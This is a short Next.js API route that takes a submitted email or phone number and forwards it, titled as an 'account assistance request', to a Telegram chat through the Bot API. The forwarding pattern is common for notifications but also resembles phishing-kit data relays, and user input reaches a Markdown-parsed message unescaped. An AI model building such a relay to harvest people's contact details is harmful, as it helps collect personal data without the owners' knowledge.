import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { email, phone, country, isPhone } = body;

    if (!email && !phone) {
      return NextResponse.json(
        { success: false, error: 'Email or phone number is required' },
        { status: 400 }
      );
    }

    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = process.env.TELEGRAM_CHAT_ID;

    if (telegramBotToken && telegramChatId) {
      try {
        const contactInfo = isPhone 
          ? `📱 Phone: ${country?.dialCode || ''} ${phone}\n🌍 Country: ${country?.name || 'Unknown'}`
          : `📧 Email: ${email}`;

        const message = `🔔 New Account Assistance Request\n\n${contactInfo}\n\n📅 Timestamp: ${new Date().toISOString()}`;

        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        
        await fetch(telegramUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'Markdown',
          }),
        });
      } catch (telegramError) {
        console.error('Error sending to Telegram:', telegramError);
      }
    }

    return NextResponse.json({
      success: true,
      message: 'Contact information submitted successfully',
    });
  } catch (error: any) {
    console.error('Error submitting contact:', error);
    return NextResponse.json(
      { success: false, error: error.message || 'Failed to submit contact information' },
      { status: 500 }
    );
  }
}

